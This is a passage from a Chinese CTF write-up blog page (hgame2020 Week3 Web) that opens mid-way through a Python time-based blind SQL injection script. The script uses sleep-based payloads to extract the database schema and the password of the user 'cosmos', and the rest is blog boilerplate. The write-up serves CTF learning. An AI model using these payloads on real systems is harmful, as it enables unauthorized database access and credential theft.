<span class="keyword">if</span> mid == left:</span><br><span class="line">                name += chr(mid)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            start_time = time.time()</span><br><span class="line">            full_payload = payload.format(id=create_message(),num1=str(i),num2=str(mid))</span><br><span class="line">            requests.get(url=url+full_payload,headers=headers)</span><br><span class="line">            print(full_payload)</span><br><span class="line">            <span class="keyword">if</span> time.time() - start_time &gt; <span class="number">2.5</span>:</span><br><span class="line">                right = mid</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                left = mid</span><br><span class="line">    <span class="keyword">return</span> name</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里爆破库名长度</span></span><br><span class="line"><span class="comment"># 7</span></span><br><span class="line">database_length_payload = <span class="string">"&#123;id&#125; and if(ascii(mid(length(database()),&#123;num1&#125;,1))&lt;&#123;num2&#125;,sleep(3),1)"</span></span><br><span class="line">database_length = binary_search_sql(<span class="number">48</span>,<span class="number">57</span>,database_length_payload,<span class="number">1</span>)</span><br><span class="line">print(<span class="string">'database_length:'</span>+database_length)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里爆破库名</span></span><br><span class="line"><span class="comment"># babysql</span></span><br><span class="line">database_payload = <span class="string">"&#123;id&#125; and if(ascii(mid((database()),&#123;num1&#125;,1))&lt;&#123;num2&#125;,sleep(3),1)"</span></span><br><span class="line">print(<span class="string">'database_name:'</span>+binary_search_sql(<span class="number">33</span>,<span class="number">127</span>,database_payload,<span class="number">7</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里爆破表名长度</span></span><br><span class="line"><span class="comment"># 13</span></span><br><span class="line">table_length_payload = <span class="string">"&#123;id&#125; and if((ascii(mid((length((select group_concat(table_name) from information_schema.tables where table_schema=database()))),&#123;num1&#125;,1))&lt;&#123;num2&#125;),sleep(3),1)"</span></span><br><span class="line">table_length = binary_search_sql(<span class="number">48</span>,<span class="number">57</span>,table_length_payload)</span><br><span class="line">print(<span class="string">'table_length:'</span>+table_length)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里爆破表名</span></span><br><span class="line"><span class="comment"># messages,user</span></span><br><span class="line">table_name_payload = <span class="string">"&#123;id&#125; and if((ascii(mid(((select group_concat(table_name) from information_schema.tables where table_schema=database())),&#123;num1&#125;,1))&lt;&#123;num2&#125;),sleep(3),1)"</span></span><br><span class="line">print(<span class="string">'table_name:'</span>+binary_search_sql(<span class="number">33</span>,<span class="number">127</span>,table_name_payload,int(table_length)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里爆破messages表下的字段长度</span></span><br><span class="line"><span class="comment"># 26</span></span><br><span class="line">column_length_payload = <span class="string">'&#123;id&#125; and if((ascii(mid(length((select group_concat(column_name) from information_schema.columns where table_name=0x6D65737361676573)),&#123;num1&#125;,1)) &lt;&#123;num2&#125;),sleep(3),1)'</span></span><br><span class="line">column_length = binary_search_sql(<span class="number">48</span>,<span class="number">57</span>,column_length_payload)</span><br><span class="line">print(<span class="string">'column_length:'</span>+column_length)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里爆破messages表下的字段</span></span><br><span class="line"><span class="comment"># message_id,user_id,message</span></span><br><span class="line">column_name_payload = <span class="string">'&#123;id&#125; and if((ascii(mid(((select group_concat(column_name) from information_schema.columns where table_name=0x6D65737361676573)),&#123;num1&#125;,1))&lt;&#123;num2&#125;),sleep(3),1)'</span></span><br><span class="line">print(<span class="string">'column_name:'</span>+binary_search_sql(<span class="number">33</span>,<span class="number">127</span>,column_name_payload,int(column_length)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里爆破user表下的字段长度</span></span><br><span class="line"><span class="comment"># 16</span></span><br><span class="line">column2_length_payload = <span class="string">'&#123;id&#125; and if((ascii(mid(length((select group_concat(column_name) from information_schema.columns where table_name=0x75736572)),&#123;num1&#125;,1)) &lt;&#123;num2&#125;),sleep(3),1)'</span></span><br><span class="line">column2_length = binary_search_sql(<span class="number">48</span>,<span class="number">57</span>,column2_length_payload)</span><br><span class="line">print(<span class="string">'column_length:'</span>+column2_length)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里爆破user表下的字段</span></span><br><span class="line"><span class="comment"># id,name,password</span></span><br><span class="line">column2_name_payload = <span class="string">'&#123;id&#125; and if((ascii(mid(((select group_concat(column_name) from information_schema.columns where table_name=0x75736572)),&#123;num1&#125;,1))&lt;&#123;num2&#125;),sleep(3),1)'</span></span><br><span class="line">print(<span class="string">'column_name:'</span>+binary_search_sql(<span class="number">33</span>,<span class="number">127</span>,column2_name_payload,int(column2_length)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里爆破user表下的数据长度</span></span><br><span class="line"><span class="comment"># 28</span></span><br><span class="line">data_user_length_payload = <span class="string">'&#123;id&#125; and if((ascii(mid(length((select password from babysql.user where name=\'cosmos\')),&#123;num1&#125;,1))&lt;&#123;num2&#125;),sleep(3),1)'</span></span><br><span class="line">data_user_length = binary_search_sql(<span class="number">48</span>,<span class="number">57</span>,data_user_length_payload)</span><br><span class="line">print(<span class="string">'data_user_length:'</span>+data_user_length)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里爆破user表下的数据</span></span><br><span class="line">data_user_payload = <span class="string">'&#123;id&#125; and if((ascii(mid((select password from babysql.user where name=\'cosmos\'),&#123;num1&#125;,1))&lt;&#123;num2&#125;),sleep(3),1)'</span></span><br><span class="line">print(<span class="string">'data_user:'</span>+binary_search_sql(<span class="number">33</span>,<span class="number">127</span>,data_user_payload,int(data_user_length)))</span><br></pre></td></tr></table></figure>
+<p>然后得到<code>cosmos</code>的密码，登录即可得到flag</p>
+
+      
+    </div>
+    
+    
+    
+
+	<div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
+  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  <p><span>本文标题:</span><a href="/2020/02/04/hgame2020-Level-Week3-Web-writeup/">hgame2020-Level-Week3_Web_writeup</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 xianyu123 的个人博客">xianyu123</a></p>
+  <p><span>发布时间:</span>2020年02月04日 - 12:28</p>
+  <p><span>最后更新:</span>2020年02月28日 - 20:21</p>
+  <p><span>原始链接:</span><a href="/2020/02/04/hgame2020-Level-Week3-Web-writeup/" title="hgame2020-Level-Week3_Web_writeup">http://0clickjacking0.github.io/2020/02/04/hgame2020-Level-Week3-Web-writeup/</a>
+    <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://0clickjacking0.github.io/2020/02/04/hgame2020-Level-Week3-Web-writeup/" aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
+</div>
+<script> 
+    var clipboard = new Clipboard('.fa-clipboard');
+    $(".fa-clipboard").click(function(){
+      clipboard.on('success', function(){
+        swal({   
+          title: "",   
+          text: '复制成功',
+          icon: "success", 
+          showConfirmButton: true
+          });
+	});
+    });  
+</script>
+
+
+      
+</div>
+
+
+    
+
+    
+
+    
+
+	
+	<div>
+  
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------　　　　本文结束　<i class="fa fa-heart"></i>　感谢您的阅读　　　　-------------</div>
+    
+</div>
+  
+</div>
+	
+	
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/02/02/xss攻击时bypass的一些总结/" rel="next" title="xss攻击时bypass的一些总结">
+                <i class="fa fa-chevron-left"></i> xss攻击时bypass的一些总结
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/02/08/BJDCTF2020复现/" rel="prev" title="BJDCTF2020复现">
+                BJDCTF2020复现 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">xianyu123</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">44</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://only-free.github.io/" title="小彪" target="_blank">小彪</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.kr1sten.cn/" title="K神" target="_blank">K神</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://charon.xin/" title="Char0n" target="_blank">Char0n</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://tgaout.github.io/categories/" title="TGAO" target="_blank">TGAO</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://brownfly.github.io/" title="Insomnia" target="_blank">Insomnia</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://r0co.top/" title="r0co" target="_blank">r0co</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://blog.ragdoll.work/" title="南梦师傅" target="_blank">南梦师傅</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.hutc.xyz/" title="luz" target="_blank">luz</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://liotree.github.io/" title="LionTree师傅" target="_blank">LionTree师傅</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://cnblogs.com/klsfct" title="圆周师傅" target="_blank">圆周师傅</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.csdn.net/zz_Caleb/" title="Sea_Sand息禅师傅" target="_blank">Sea_Sand息禅师傅</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://flag0.com/" title="flag0师傅" target="_blank">flag0师傅</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#二发入魂！"><span class="nav-number">1.</span> <span class="nav-text">二发入魂！</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Cosmos的留言板-2"><span class="nav-number">2.</span> <span class="nav-text">Cosmos的留言板-2</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+   
+  </span>
+  <span class="author" itemprop="copyrightHolder">xianyu123</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail';
+    guest = guest.split(',').filter(item=>{
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: false,
+        notify: false,
+        appId: '9NfSKiv9nK43bHqe0PASB6LJ-gzGzoHsz',
+        appKey: 'jL5QGkWKt6bpnKpTNwkA5c9n',
+        placeholder: '有想说的欢迎留言，留下你的邮箱，有回复就会提醒你~（邮箱不会被公开）',
+        avatar:'',
+        guest_info:guest,
+        pageSize:'10' || 10,
+		avatar_cdn:'https://www.gravatar.com/avatar/',
+    });
+  </script>
+
+
+
+  
+
+
+
+
+  
+  
+  
+  <link rel="stylesheet" href="/lib/algolia-instant-search/instantsearch.min.css">
+
+  
+  
+  <script src="/lib/algolia-instant-search/instantsearch.min.js"></script>
+  
+
+  <script src="/js/src/algolia-search.js?v=5.1.4"></script>
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("9NfSKiv9nK43bHqe0PASB6LJ-gzGzoHsz", "jL5QGkWKt6bpnKpTNwkA5c9n");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  <script type="text/javascript" src="/lib/zclip/clipboard.min.js"></script>	
+<script type="text/javascript" src="/js/src/custom.js"></script>
+
+</body>
+</html>
